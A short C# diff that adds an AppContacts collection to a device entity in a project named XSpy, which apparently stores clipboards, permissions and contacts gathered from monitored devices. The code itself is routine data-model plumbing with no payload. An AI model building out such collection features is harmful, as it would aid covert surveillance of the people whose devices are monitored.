@@ -30,6 +30,7 @@ namespace XSpy.Database.Entities.Devices
         private ICollection<Permission> _permissions;
         private ICollection<TempPath> _tempPaths;
         private ICollection<Clipboard> _clipboards;
+        private ICollection<AppContact> _appContacts;
         [Key, Column("id")] public Guid Id { get; set; }
 
         [Column("user_id"), ForeignKey(nameof(UserData))]
@@ -121,6 +122,11 @@ namespace XSpy.Database.Entities.Devices
         {
             get => LazyLoader.Load(this, ref _clipboards);
             set => _clipboards = value;
+        }
+        public ICollection<AppContact> AppContacts
+        {
+            get => LazyLoader.Load(this, ref _appContacts);
+            set => _appContacts = value;
         }
     }
 }
